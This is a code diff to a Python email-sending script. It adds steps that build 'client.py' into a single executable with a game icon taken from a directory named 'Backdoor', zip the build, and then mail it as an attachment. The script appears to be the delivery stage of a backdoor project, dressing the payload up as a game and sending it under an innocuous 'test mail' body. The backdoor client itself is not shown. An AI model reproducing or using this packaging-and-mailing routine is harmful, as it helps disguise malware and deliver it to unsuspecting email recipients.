@@ -1,9 +1,13 @@
+import os
 import smtplib
+import zipfile
+import PyInstaller.__main__
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 from os.path import basename
+
 
 mail_content = '''Hello,
 This is a test mail using Python SMTP library.
@@ -65,7 +69,30 @@ def send_email():
     print('Mail Sent')
 
 
+def zip_directory(path, ziph):
+    """Function used to archive files in a specific directory"""
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file),
+                       os.path.relpath(os.path.join(root, file),
+                                       os.path.join(path, '..')))
+
+
+def create_executable():
+    """Function used to create the executable and archive it along with its dependencies through zipfile"""
+    PyInstaller.__main__.run([
+        'client.py',
+        '--onefile',
+        '--icon=/home/magda/Backdoor/game.ico'
+    ])
+
+    zipf = zipfile.ZipFile('client.zip', 'w', zipfile.ZIP_DEFLATED)
+    zip_directory('dist', zipf)
+    zipf.close()
+
+
 if __name__ == "__main__":
+    create_executable()
     setup_mime()
     setup_email_body()
     send_email()
